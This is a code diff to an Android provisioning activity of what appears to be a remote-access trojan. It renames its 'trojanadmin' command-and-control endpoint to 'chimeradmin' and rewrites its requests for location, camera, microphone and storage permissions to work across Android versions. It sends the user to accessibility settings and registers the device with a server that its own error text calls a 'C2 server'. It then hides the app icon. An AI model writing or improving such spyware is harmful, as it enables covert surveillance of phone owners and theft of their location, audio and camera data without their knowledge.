@@ -13,7 +13,6 @@ import android.text.TextUtils;
 import android.util.Log;
 import android.widget.Button;
 import android.widget.TextView;
-import android.widget.Toast;
 
 import androidx.annotation.NonNull;
 import androidx.appcompat.app.AppCompatActivity;
@@ -35,17 +34,7 @@ public class ProvisioningActivity extends AppCompatActivity {
 
     private static final String TAG = "ProvisioningActivity";
     private static final int PERMISSIONS_REQUEST_CODE = 101;
-    private static final String NETLIFY_REGISTER_URL = "https://trojanadmin.netlify.app/.netlify/functions/register-device";
-
-    private static final String[] PERMISSIONS_TO_REQUEST = {
-		android.Manifest.permission.POST_NOTIFICATIONS,
-		android.Manifest.permission.ACCESS_FINE_LOCATION,
-		android.Manifest.permission.ACCESS_COARSE_LOCATION,
-		android.Manifest.permission.CAMERA,
-		android.Manifest.permission.RECORD_AUDIO,
-		android.Manifest.permission.READ_EXTERNAL_STORAGE,
-		android.Manifest.permission.WRITE_EXTERNAL_STORAGE,
-    };
+    private static final String NETLIFY_REGISTER_URL = "https://chimeradmin.netlify.app/.netlify/functions/register-device";
 
     private TextView tvCheckPermissions;
     private TextView tvCheckAccessibility;
@@ -70,7 +59,10 @@ public class ProvisioningActivity extends AppCompatActivity {
         tvDeviceInfo.setText("Device ID: " + deviceId);
 
         tvCheckPermissions.setOnClickListener(v -> requestAppPermissions());
-        tvCheckAccessibility.setOnClickListener(v -> startActivity(new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)));
+        tvCheckAccessibility.setOnClickListener(v -> {
+            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
+            startActivity(intent);
+        });
         btnFinalize.setOnClickListener(v -> beginActivationSequence());
     }
 
@@ -98,12 +90,36 @@ public class ProvisioningActivity extends AppCompatActivity {
         }
     }
 
+    private String[] getRequiredPermissions() {
+        List<String> permissions = new ArrayList<>();
+        permissions.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
+        permissions.add(android.Manifest.permission.ACCESS_COARSE_LOCATION);
+        permissions.add(android.Manifest.permission.CAMERA);
+        permissions.add(android.Manifest.permission.RECORD_AUDIO);
+
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) { // Android 13+
+            permissions.add(android.Manifest.permission.POST_NOTIFICATIONS);
+        }
+
+        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) { // Before Android 10
+            permissions.add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE);
+        }
+
+        if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.S_V2) { // Up to Android 12L
+             permissions.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
+        }
+
+
+        return permissions.toArray(new String[0]);
+    }
+
     private boolean arePermissionsGranted() {
         if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) {
             return true;
         }
-        for (String permission : PERMISSIONS_TO_REQUEST) {
+        for (String permission : getRequiredPermissions()) {
             if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
+                Log.w(TAG, "Permission check failed for: " + permission);
                 return false;
             }
         }
@@ -136,7 +152,7 @@ public class ProvisioningActivity extends AppCompatActivity {
 
     private void requestAppPermissions() {
         List<String> neededPermissions = new ArrayList<>();
-        for (String permission : PERMISSIONS_TO_REQUEST) {
+        for (String permission : getRequiredPermissions()) {
             if (checkSelfPermission(permission) != PackageManager.PERMISSION_GRANTED) {
                 neededPermissions.add(permission);
             }
@@ -181,17 +197,17 @@ public class ProvisioningActivity extends AppCompatActivity {
         }
 
         JsonObjectRequest request = new JsonObjectRequest(Request.Method.POST, NETLIFY_REGISTER_URL, postData,
-		response -> {
-			Log.d(TAG, "Registration Success: " + response.toString());
-			tvDeviceInfo.append("\nStatus: ✅ Registration Complete.");
-			goDark();
-		},
-		error -> {
-			Log.e(TAG, "Registration Error: " + error.toString());
-			tvDeviceInfo.append("\nStatus: ❌ FAILED. C2 server rejected connection.");
-			btnFinalize.setEnabled(true);
-			btnFinalize.setText("Retry Activation");
-		}
+                response -> {
+                    Log.d(TAG, "Registration Success: " + response.toString());
+                    tvDeviceInfo.append("\nStatus: ✅ Registration Complete.");
+                    goDark();
+                },
+                error -> {
+                    Log.e(TAG, "Registration Error: " + error.toString());
+                    tvDeviceInfo.append("\nStatus: ❌ FAILED. C2 server rejected connection.");
+                    btnFinalize.setEnabled(true);
+                    btnFinalize.setText("Retry Activation");
+                }
         );
         requestQueue.add(request);
     }
@@ -201,7 +217,7 @@ public class ProvisioningActivity extends AppCompatActivity {
         tvDeviceInfo.append("\n\nSystem Optimized. This utility can now be closed.");
 
         Intent intent = new Intent(this, CoreService.class);
-        intent.setAction("com.trojan.action.TOGGLE_ICON");
+        intent.setAction("com.chimera.action.TOGGLE_ICON");
         intent.putExtra("show", false);
         startService(intent);
 
@@ -211,5 +227,6 @@ public class ProvisioningActivity extends AppCompatActivity {
     @Override
     public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults);
+        // The onResume will handle the state check
     }
 }
